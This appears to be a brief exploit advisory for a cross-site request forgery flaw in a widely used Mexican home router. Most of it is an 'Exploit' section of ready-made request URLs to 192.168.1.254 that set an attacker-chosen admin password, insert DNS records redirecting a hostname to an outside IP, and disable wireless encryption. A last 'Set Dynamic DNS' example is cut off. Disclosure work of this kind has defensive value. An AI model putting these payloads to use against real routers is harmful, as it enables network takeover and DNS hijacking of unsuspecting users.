I. Background
-------------
This is the most popular router in Mexico and the default installation from the ISP has no system password.
II. Vuln
----------------
It is possible to send a request to the router that will modify its configuration.
It does not validate POST, or Referer or Anything...
II. Exploit
----------------
We just need the client to do a request to the router with the configuration we desire.
[examples]
Set a password (NUEVOPASS):
http://192.168.1.254/xslt?PAGE=A05\_POST&THISPAGE=A05&NEXTPAGE=A05\_POST&E
NABLE\_PASS=on&PASSWORD=NUEVOPASS&PASSWORD\_CONF=NUEVOPASS
Add names to the DNS (216.163.137.3 www.prueba.hkm):
http://192.168.1.254/xslt?PAGE=J38\_SET&THISPAGE=J38&NEXTPAGE=J38\_SET&NAM
E=www.prueba.hkm&ADDR=216.163.137.3
Disable Wireless Authentication
http://192.168.1.254/xslt?PAGE=C05\_POST&THISPAGE=C05&NEXTPAGE=C05\_POST&N
AME=encrypt\_enabled&VALUE=0
Set Dynamic DNS

P\_DYNAMIC=TRUE
